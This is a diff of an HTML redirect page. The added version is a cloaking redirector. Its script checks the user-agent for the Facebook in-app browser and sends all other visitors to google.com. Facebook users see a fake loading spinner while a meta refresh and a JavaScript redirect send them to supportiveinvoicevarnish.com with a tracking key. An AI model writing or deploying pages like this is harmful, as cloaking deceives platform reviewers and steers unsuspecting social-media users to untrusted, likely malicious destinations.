@@ -1,20 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <script>
-if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-    location.replace("https://t.co/kRInNZwCep");
-} else {
-    location.replace("https://open.spotify.com/");
-}
-</script>
+        // STRICT CHECK: Sirf FB Browser & FB Lite Allowed
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            
+            // Check for Facebook App / FB Lite User-Agent
+            var isFB = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("FB_IAB") > -1) || (ua.indexOf("FBLC") > -1) || (ua.indexOf("FB4A") > -1);
 
-<title>Redirecting...</title>
+            // Agar Facebook Browser/FB Lite nahi hai, toh google.com bhejo
+            if (!isFB) {
+                window.location.replace("https://www.google.com");
+            }
+        })();
+    </script>
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+
+    <meta http-equiv="refresh" content="0;url=https://supportiveinvoicevarnish.com/b97jkrdr93?key=653930fe013dc47d0e8c2f5a3610b77c">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-Redirecting...
+
+    <div class="loader"></div>
+
+    <script type="text/javascript">
+        setTimeout(function() {
+            window.location.href = "https://supportiveinvoicevarnish.com/b97jkrdr93?key=653930fe013dc47d0e8c2f5a3610b77c";
+        }, 0);
+    </script>
+
 </body>
 </html>
